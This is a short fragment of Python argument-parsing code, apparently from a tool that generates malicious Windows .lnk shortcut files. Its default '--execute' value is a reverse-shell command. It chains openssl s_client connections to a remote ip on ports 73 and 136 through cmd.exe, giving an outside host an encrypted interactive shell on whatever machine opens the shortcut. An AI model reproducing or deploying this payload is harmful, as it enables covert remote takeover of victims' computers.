...
def parse_cmd_line_args():
    ...
    parser.add_argument(
        '--output',
        metavar='o',
	default='others/output.lnk',
        help='The name of the lnk file'
    )
    parser.add_argument(
        '--execute',
        metavar='e',
        default=[r'C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect {}:73 | cmd.exe | C:\Progra~2\OpenSSL-v1.1.0\bin\openssl.exe s_client -quiet -connect {}:136'.format(ip,ip)],
        nargs='+',
